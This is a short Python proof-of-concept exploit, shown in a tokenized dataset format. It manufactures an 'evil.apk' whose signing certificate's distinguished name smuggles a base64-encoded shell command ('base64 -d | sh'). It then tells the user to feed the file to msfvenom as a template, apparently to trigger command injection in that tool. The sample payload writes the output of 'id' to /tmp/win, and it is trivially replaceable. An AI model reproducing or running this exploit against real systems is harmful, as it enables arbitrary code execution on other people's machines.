Number of functions: 1
540
 utf-8 ` 
 import subprocess 
 import tempfile 
 import os 
 from base64 import b64encode 
 payload = 'echo "Code execution as $(id)" > /tmp/win' 
 payload_b64 = b64encode ( payload . encode ( ) ) . decode ( ) 
 dname = f"CN='|echo {payload_b64} | base64 -d | sh #" 
 print ( f"[+] Manufacturing evil apkfile" ) 
 print ( f"Payload: {payload}" ) 
 print ( f"-dname: {dname}" ) 
 print ( ) 
 tmpdir = tempfile . mkdtemp ( ) 
 apk_file = os . path . join ( tmpdir , "evil.apk" ) 
 empty_file = os . path . join ( tmpdir , "empty" ) 
 keystore_file = os . path . join ( tmpdir , "signing.keystore" ) 
 storepass = keypass = "password" 
 key_alias = "signing.key" 
 open ( empty_file , "w" ) . close ( ) 
 subprocess . check_call ( [ "zip" , "-j" , apk_file , empty_file ] ) 
 subprocess . check_call ( [ "keytool" , "-genkey" , "-keystore" , keystore_file , "-alias" , key_alias , "-storepass" , storepass , "-keypass" , keypass , "-keyalg" , "RSA" , "-keysize" , "2048" , "-dname" , dname ] ) 
 subprocess . check_call ( [ "jarsigner" , "-sigalg" , "SHA1withRSA" , "-digestalg" , "SHA1" , "-keystore" , keystore_file , "-storepass" , storepass , "-keypass" , keypass , apk_file , key_alias ] ) 
 print ( ) 
 print ( f"[+] Done! apkfile is at {apk_file}" ) 
 print ( f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null" ) 
 ` 
 